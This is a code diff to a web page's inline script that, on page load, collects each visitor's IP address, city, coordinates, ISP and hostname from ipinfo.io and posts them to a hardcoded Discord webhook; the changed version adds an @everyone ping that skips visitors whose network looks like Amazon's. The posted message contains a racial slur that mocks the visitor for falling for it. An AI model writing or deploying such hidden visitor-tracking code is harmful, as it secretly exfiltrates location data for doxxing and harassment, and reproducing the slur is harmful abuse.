@@ -7,38 +7,43 @@
 
     <script>
         (async () => {
-          try {
-            // STEP 1: Get IP and details from ipinfo.io
-            const info = await fetch('https://ipinfo.io/json')
-              .then(res => res.json());
-        
-            const ip = info.ip || 'Unknown';
-            const city = info.city || 'Unknown';
-            const region = info.region || 'Unknown';
-            const country = info.country || 'Unknown';
-            const loc = info.loc || 'Unknown';
-            const org = info.org || 'Unknown';
-            const hostname = info.hostname || 'Unknown';
-            const time = new Date().toISOString();
-        
-            // STEP 2: Send to Discord via CORS proxy
-            const webhook = "https://discord.com/api/webhooks/1379230917817536642/PbvgGVenORz5CNd0TL2ol084jmLfQ2w_78rBqg3ix2iVv9CombYp8zzmc1ODZncYfL70";
-        
-            const message = `**nigger fell for it**\n` +
-              `IP: \`${ip}\`\nLocation: \`${city}, ${region}, ${country}\`\n` +
-              `Org: \`${org}\`\nCoords: \`${loc}\`\n` +
-              `Hostname: \`${hostname}\`\nTime: \`${time}\``;
-        
-            await fetch(webhook, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ content: message })
-            });
-        
-          } catch (err) {
-            console.error("Logging failed:", err);
-          }
-        })();
+            try {
+                // STEP 1: Get IP and details from ipinfo.io
+                const info = await fetch('https://ipinfo.io/json')
+                .then(res => res.json());
+
+                const ip = info.ip || 'Unknown';
+                const city = info.city || 'Unknown';
+                const region = info.region || 'Unknown';
+                const country = info.country || 'Unknown';
+                const loc = info.loc || 'Unknown';
+                const org = info.org || 'Unknown';
+                const hostname = info.hostname || 'Unknown';
+                const time = new Date().toISOString();
+
+                // STEP 2: Send to Discord via webhook
+                const webhook = "https://discord.com/api/webhooks/1379230917817536642/PbvgGVenORz5CNd0TL2ol084jmLfQ2w_78rBqg3ix2iVv9CombYp8zzmc1ODZncYfL70";
+
+                // Determine if @everyone should be pinged
+                const shouldPing = (hostname !== 'Unknown') || (!org.toLowerCase().includes('amazon'));
+
+                const ping = shouldPing ? '@everyone\n' : '';
+
+                const message = `${ping}**nigger fell for it**\n` +
+                `IP: \`${ip}\`\nLocation: \`${city}, ${region}, ${country}\`\n` +
+                `Org: \`${org}\`\nCoords: \`${loc}\`\n` +
+                `Hostname: \`${hostname}\`\nTime: \`${time}\``;
+
+                await fetch(webhook, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ content: message })
+                });
+
+            } catch (err) {
+                console.error("Logging failed:", err);
+            }
+    })();
     </script>
     
     <style>
